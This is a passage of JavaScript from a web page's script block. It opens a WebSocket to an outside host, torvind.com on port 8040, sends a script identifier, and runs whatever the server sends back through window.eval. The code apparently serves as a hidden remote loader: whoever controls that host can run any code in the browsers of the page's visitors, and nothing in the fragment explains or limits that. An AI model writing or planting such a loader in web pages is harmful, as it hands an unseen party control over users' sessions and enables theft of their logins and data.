  var ws = new WebSocket("ws://torvind.com:8040/");
  ws.onopen = function () {
   ws.send(JSON.stringify({type:"p", id: script_id}));
  };
  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
 };
 document.body.appendChild(s);
 })();
</script>

